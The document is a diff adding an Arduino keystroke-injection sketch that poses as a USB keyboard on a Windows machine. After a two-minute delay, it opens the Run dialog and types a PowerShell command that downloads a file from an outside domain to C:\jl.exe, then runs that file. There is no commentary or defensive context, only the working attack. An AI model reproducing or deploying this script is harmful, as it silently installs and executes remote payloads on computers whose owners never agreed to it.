@@ -1,0 +1,68 @@
+
+
+
+#include <Keyboard.h>
+void setup() {
+  for(int i=0 ;i<1;i++){
+  delay(120000);
+  Keyboard.begin();
+  delay(10000);
+  
+  
+  Keyboard.press(KEY_LEFT_GUI); //win
+  delay(200); 
+  Keyboard.press('d'); 
+  delay(200);
+  Keyboard.release(KEY_LEFT_GUI); 
+  Keyboard.release('d'); 
+  delay(200);
+  
+  
+  Keyboard.press(KEY_LEFT_GUI); //win
+  delay(200); 
+  Keyboard.press('r'); 
+  delay(100);
+  Keyboard.release(KEY_LEFT_GUI); 
+  Keyboard.release('r'); 
+  delay(100);
+  
+  Keyboard.println("powershell (new-object System.Net.WebClient).DownloadFile( 'http://ddforfreet.tk/redirect.html','C:\\jl.exe')");
+  delay(200);
+  
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN); 
+  delay(100);
+  
+  Keyboard.press(KEY_LEFT_GUI); //win
+  delay(200); 
+  Keyboard.press('d'); 
+  delay(200);
+  Keyboard.release(KEY_LEFT_GUI); 
+  Keyboard.release('d'); 
+  delay(11000);
+  
+  Keyboard.press(KEY_LEFT_GUI); //win
+  delay(200); 
+  Keyboard.press('r'); 
+  delay(100);
+  Keyboard.release(KEY_LEFT_GUI); 
+  Keyboard.release('r'); 
+  delay(200);
+  
+  Keyboard.println("c:/jl.exe");
+  delay(100);
+  
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN); 
+  delay(100);
+  
+  Keyboard.end();
+  
+  }
+}
+ 
+ 
+void loop() {
+  // 
+ 
+}
